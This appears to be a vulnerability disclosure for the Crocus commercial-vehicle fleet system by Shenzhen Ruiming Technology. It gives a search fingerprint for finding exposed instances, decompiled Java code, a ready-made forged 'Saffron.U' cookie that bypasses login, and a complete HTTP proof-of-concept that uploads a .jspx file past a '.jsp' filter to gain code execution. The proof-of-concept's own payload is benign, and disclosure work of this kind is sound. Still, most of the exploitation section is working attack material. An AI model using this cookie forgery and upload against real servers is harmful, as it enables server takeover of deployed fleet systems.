# Arbitrary File Upload Vulnerability in the FileDir.do Interface of Crocus System by Shenzhen Ruiming Technology Co., Ltd.

## Basic Information

### System Overview
As a provider of intelligent IoT (AIoT) solutions for commercial vehicles focusing on AI and video technologies, Shenzhen Ruiming Technology Co., Ltd. has the Crocus System as one of its core products. The Crocus System is designed to leverage artificial intelligence (AI), high-definition (HD) video, big data, and autonomous driving technologies to help commercial vehicles reduce traffic accidents and cargo loss, while improving the operational efficiency of enterprises or fleets.

the company's official website：https://www.streamax.com/page/about.html
<img width="2234" height="1040" alt="image" src="https://github.com/user-attachments/assets/91d5964d-7b13-41b0-8e93-3f6fd9be0aae" />

### System Fingerprint
`body="/ThirdResource/respond/respond.min.js" && title="Crocus"`

<img width="1595" height="1150" alt="image" src="https://github.com/user-attachments/assets/a0fe1cda-b99c-46af-a4ba-51f551c30cc8" />

## Vulnerability Exploitation

### Privilege Bypass

<img width="1911" height="1091" alt="image" src="https://github.com/user-attachments/assets/388ced0b-2c69-45c7-8502-2c752773dec8" />

We found the location where the Cookie is generated in `streamax.saffron.controller.registerlogin.RegisterLoginController#SetUserCookie`.
It can be seen that all its parameters are controllable by the user. The code is as follows:

```java
    private void SetUserCookie(int userID, String userName, String password, int roleID, String guid, String map, String ins, HttpServletResponse response) throws Exception {
        String cookieStr = "UID=%s&UN=%s&GID=%s&RID=%s&M=%s&INS=%s";
        if (!CommonFunction.validate(new String[]{map})) {
            map = "";
        }

        if (!CommonFunction.validate(new String[]{ins})) {
            ins = "0";
        }

        cookieStr = String.format(cookieStr, userID, userName, guid, roleID, map, ins);
        String base64 = (new BASE64Encoder()).encode(cookieStr.getBytes("utf-8"));
        base64 = base64.replaceAll("\r|\n", "");
        Cookie cookie = new Cookie("Saffron.U", base64);
        cookie.setMaxAge(-1);
        cookie.setPath("/");
        response.addCookie(cookie);
    }
```
Based on this, we can forge a Cookie:

```
Cookie:Saffron.U="VUlEPTEmR0lEPTE3NTk4MTczMjgyMzg0NyZSSUQ9MSZNPUdNYXAmSU5TPTA="
```
<img width="525" height="475" alt="image" src="https://github.com/user-attachments/assets/e6a4be9c-d171-4426-8af6-66be581cb523" />

At this point, we have bypassed the authentication of this system.

### Arbitrary File Upload Vulnerability Exploitation

We found a sink point in `streamax.saffron.controller.deviceupgrade.FileManageController#uploadFile`:
```java
@RequestMapping(
        params = {"Action=Upload"}
    )
    @ResponseBody
    public Object uploadFile(HttpServletRequest request, HttpServletResponse response) {
        int code = 200;
        Map<String, Object> result = new HashMap();
        String fileName = "";
        MultipartFile multipartFile = null;

        Map var12;
        try {
            String tempName = System.currentTimeMillis() + "" + (new Random()).nextInt(100);
            String tempDirPath = request.getSession().getServletContext().getRealPath(this.TEMPPATH);
            if (!CommonFunction.isDirExist(tempDirPath)) {
                CommonFunction.createDir(tempDirPath);
            }

            MultipartHttpServletRequest mRequest = (MultipartHttpServletRequest)request;
            multipartFile = mRequest.getFile("file");
            String realName = multipartFile.getOriginalFilename();
            String suffix = "";
            if (realName.lastIndexOf(".") > 0) {
                suffix = realName.substring(realName.lastIndexOf("."));
            }

            if (!"jsp".equals(suffix)) {
                String filePath = tempDirPath + File.separator + tempName + suffix;
                File file = new File(filePath);
                FileUtils.copyInputStreamToFile(multipartFile.getInputStream(), file);
                if (CommonFunction.isExistFile(filePath)) {
                    fileName = file.getName();
                    result = this.service.parseFile(file);
                }

                ((Map)result).put("FileName", fileName);
                return CommonFunction.createResultMap(code, (Map)result);
            }

            var12 = CommonFunction.createResultMap(202, (Map)result);
        } catch (Exception var23) {
            Exception e = var23;
            code = 202;
            CommonFunction.writeExceptionLog("FileManage", e);
            return CommonFunction.createResultMap(code, (Map)result);
        } finally {
            try {
                if (multipartFile != null && multipartFile.getInputStream() != null) {
                    multipartFile.getInputStream().close();
                }
            } catch (Exception var22) {
                Exception e = var22;
                CommonFunction.writeExceptionLog("FileManage", e);
            }

        }

        return var12;
    }

```
This is a typical arbitrary file upload vulnerability in Java. Although it filters the ".jsp" suffix, we can upload files with the ".jspx" suffix to take over the server.

Based on this, we constructed the following Proof of Concept (POC):
```
POST http://ip:port/FileDir.do?Action=Upload HTTP/1.1
Host: ip:port
Content-Length: 523
Cookie:Saffron.U="VUlEPTEmR0lEPTE3NTk4MTczMjgyMzg0NyZSSUQ9MSZNPUdNYXAmSU5TPTA="
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="Action"

Upload
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="test.jspx"
Content-Type: text/plain

<xml xmlns:jsp="http://java.sun.com/JSP/Page">
    <jsp:scriptlet>
        out.println(java.util.UUID.randomUUID().toString());
        new java.io.File(application.getRealPath(request.getServletPath())).delete();
    </jsp:scriptlet>
</xml>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```
<img width="1865" height="810" alt="image" src="https://github.com/user-attachments/assets/fcf18801-f28c-4770-add5-44f9fa842557" />

Access the path `/plugin/FileManage/Temp/` + the returned file name.

<img width="1920" height="285" alt="image" src="https://github.com/user-attachments/assets/9cfda82b-8432-46ab-9fc7-e49499897f5f" />

This confirms that the FileDir.do Interface has an arbitrary file upload vulnerability.

*Thank you for your review! Wish you all the best!*
